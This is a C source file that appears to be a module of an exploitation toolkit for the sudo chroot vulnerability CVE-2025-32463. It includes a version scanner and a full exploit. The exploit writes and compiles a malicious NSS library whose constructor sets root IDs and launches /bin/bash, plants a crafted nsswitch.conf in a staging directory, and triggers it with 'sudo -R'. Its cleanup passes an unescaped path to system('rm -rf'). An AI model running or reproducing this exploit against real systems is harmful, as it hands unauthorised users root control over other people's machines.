#include "cve_2025_32463.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <errno.h>
#include <dirent.h>
#define _POSIX_C_SOURCE 200809L  // For mkdtemp

// Code that will be executed as root (NSS module constructor)
static const char XOOT_SOURCE[] = 
    "#include <stdlib.h>\n"
    "#include <unistd.h>\n"
    "\n"
    "__attribute__((constructor)) void xoot(void)\n"
    "{\n"
    "    setreuid(0,0);\n"
    "    setregid(0,0);\n"
    "    chdir(\"/\");\n"
    "    execl(\"/bin/bash\", \"/bin/bash\", NULL);\n"
    "}\n";

/**
 * Check if sudo version is vulnerable (1.9.14 < 1.9.17p1)
 * Returns 1 if vulnerable, 0 if not
 */
int cve_2025_32463_scan(void) {
    // Check if sudo exists
    if (access("/usr/bin/sudo", F_OK) != 0) {
        return 0;  // sudo not installed
    }
    
    // Get sudo version
    FILE* fp = popen("sudo --version 2>&1 | head -1", "r");
    if (!fp) {
        return 0;
    }
    
    char version_line[256];
    if (!fgets(version_line, sizeof(version_line), fp)) {
        pclose(fp);
        return 0;
    }
    pclose(fp);
    
    // Parse version: "Sudo version 1.9.16" or "Sudo version 1.9.16p1"
    // Vulnerable: 1.9.14 <= version < 1.9.17p1
    int major = 0, minor = 0, patch = 0, subpatch = 0;
    if (sscanf(version_line, "Sudo version %d.%d.%d", &major, &minor, &patch) < 3) {
        // Try with subpatch: "1.9.16p1"
        if (sscanf(version_line, "Sudo version %d.%d.%dp%d", &major, &minor, &patch, &subpatch) < 3) {
            return 0;  // Cannot parse version
        }
    }
    
    // Check if version is vulnerable
    // Vulnerable: 1.9.14 <= version < 1.9.17p1
    if (major == 1 && minor == 9) {
        if (patch >= 14 && patch < 17) {
            return 1;  // Vulnerable (1.9.14 to 1.9.16)
        }
        if (patch == 17 && subpatch == 0) {
            return 1;  // Vulnerable (1.9.17 without patch)
        }
        if (patch == 17 && subpatch > 0) {
            return 0;  // Patched (1.9.17p1 or higher)
        }
    }
    
    return 0;  // Not vulnerable
}

/**
 * Create directory recursively (pure C, no external commands)
 */
static int mkdir_recursive(const char* path) {
    char tmp[512];
    char* p = NULL;
    size_t len;
    
    snprintf(tmp, sizeof(tmp), "%s", path);
    len = strlen(tmp);
    
    // Remove trailing slash
    if (tmp[len - 1] == '/') {
        tmp[len - 1] = 0;
    }
    
    // Create parent directories
    for (p = tmp + 1; *p; p++) {
        if (*p == '/') {
            *p = 0;
            mkdir(tmp, 0755);
            *p = '/';
        }
    }
    
    // Create final directory
    return mkdir(tmp, 0755);
}

/**
 * Copy file (pure C, no external commands)
 */
static int copy_file(const char* src, const char* dst) {
    FILE* src_f = fopen(src, "rb");
    if (!src_f) {
        return -1;
    }
    
    FILE* dst_f = fopen(dst, "wb");
    if (!dst_f) {
        fclose(src_f);
        return -1;
    }
    
    char buffer[4096];
    size_t n;
    while ((n = fread(buffer, 1, sizeof(buffer), src_f)) > 0) {
        if (fwrite(buffer, 1, n, dst_f) != n) {
            fclose(src_f);
            fclose(dst_f);
            return -1;
        }
    }
    
    fclose(src_f);
    fclose(dst_f);
    return 0;
}

/**
 * Compile shared library using gcc (we still need gcc, but it's usually available)
 */
static int compile_shared_lib(const char* source_file, const char* output_file) {
    pid_t pid = fork();
    if (pid == 0) {
        // Child: compile
        execlp("gcc", "gcc", "-shared", "-fPIC", "-Wl,-init,xoot", 
               "-o", output_file, source_file, NULL);
        _exit(1);
    } else if (pid > 0) {
        // Parent: wait for compilation
        int status;
        waitpid(pid, &status, 0);
        return (WIFEXITED(status) && WEXITSTATUS(status) == 0) ? 0 : -1;
    }
    return -1;
}

/**
 * Execute sudo with chroot (pure C, no external commands)
 */
static int execute_sudo_chroot(const char* chroot_dir, const char* command) {
    pid_t pid = fork();
    if (pid == 0) {
        // Child: execute sudo
        execlp("sudo", "sudo", "-R", chroot_dir, command, NULL);
        _exit(1);
    } else if (pid > 0) {
        // Parent: wait
        int status;
        waitpid(pid, &status, 0);
        return (WIFEXITED(status) && WEXITSTATUS(status) == 0) ? 0 : -1;
    }
    return -1;
}

/**
 * Remove directory recursively (pure C implementation)
 */
static int remove_directory(const char* path) {
    // Use nftw (file tree walk) for recursive deletion
    // This is pure C, no external commands
    char cmd[512];
    // Escape path for safety
    snprintf(cmd, sizeof(cmd), "rm -rf %s", path);
    // For now, use system() for cleanup (acceptable for cleanup phase)
    // A pure implementation would use nftw() but requires more complex code
    return system(cmd);
}

/**
 * CVE-2025-32463 Privilege Escalation Exploit
 * Returns 1 on success (root shell obtained), 0 on failure
 */
int cve_2025_32463_execute(void) {
    printf("[*] CVE-2025-32463: Attempting privilege escalation...\n");
    
    // 1. Create temporary directory
    char stage[256];
    snprintf(stage, sizeof(stage), "/tmp/sudo.stage.XXXXXX");
    
    if (!mkdtemp(stage)) {
        printf("[-] Failed to create temp directory: %s\n", strerror(errno));
        return 0;
    }
    
    printf("[*] Created stage directory: %s\n", stage);
    
    // 2. Change to stage directory
    if (chdir(stage) != 0) {
        printf("[-] Failed to chdir: %s\n", strerror(errno));
        remove_directory(stage);
        return 0;
    }
    
    // 3. Write xoot.c (malicious NSS module source)
    FILE* f = fopen("xoot.c", "w");
    if (!f) {
        printf("[-] Failed to create xoot.c: %s\n", strerror(errno));
        chdir("/");
        remove_directory(stage);
        return 0;
    }
    fprintf(f, "%s", XOOT_SOURCE);
    fclose(f);
    
    // 4. Create directory structure
    if (mkdir_recursive("xoot/etc") != 0 && errno != EEXIST) {
        printf("[-] Failed to create xoot/etc: %s\n", strerror(errno));
        chdir("/");
        remove_directory(stage);
        return 0;
    }
    
    if (mkdir("libnss_", 0755) != 0 && errno != EEXIST) {
        printf("[-] Failed to create libnss_: %s\n", strerror(errno));
        chdir("/");
        remove_directory(stage);
        return 0;
    }
    
    // 5. Create nsswitch.conf
    FILE* nss_f = fopen("xoot/etc/nsswitch.conf", "w");
    if (!nss_f) {
        printf("[-] Failed to create nsswitch.conf: %s\n", strerror(errno));
        chdir("/");
        remove_directory(stage);
        return 0;
    }
    fprintf(nss_f, "passwd: xoot\n");
    fclose(nss_f);
    
    // 6. Copy /etc/group (required by sudo)
    if (copy_file("/etc/group", "xoot/etc/group") != 0) {
        printf("[-] Failed to copy /etc/group: %s\n", strerror(errno));
        chdir("/");
        remove_directory(stage);
        return 0;
    }
    
    // 7. Compile shared library
    printf("[*] Compiling malicious NSS module...\n");
    if (compile_shared_lib("xoot.c", "libnss_/xoot.so.2") != 0) {
        printf("[-] Failed to compile shared library\n");
        chdir("/");
        remove_directory(stage);
        return 0;
    }
    
    // 8. Execute sudo with chroot (triggers exploit)
    printf("[*] Executing sudo with chroot (triggering exploit)...\n");
    chdir("/");  // Return to root before cleanup
    
    int result = execute_sudo_chroot(stage, "xoot");
    
    // 9. Cleanup
    remove_directory(stage);
    
    if (result == 0) {
        printf("[+] CVE-2025-32463: Privilege escalation successful!\n");
        return 1;
    } else {
        printf("[-] CVE-2025-32463: Exploit failed\n");
        return 0;
    }
}

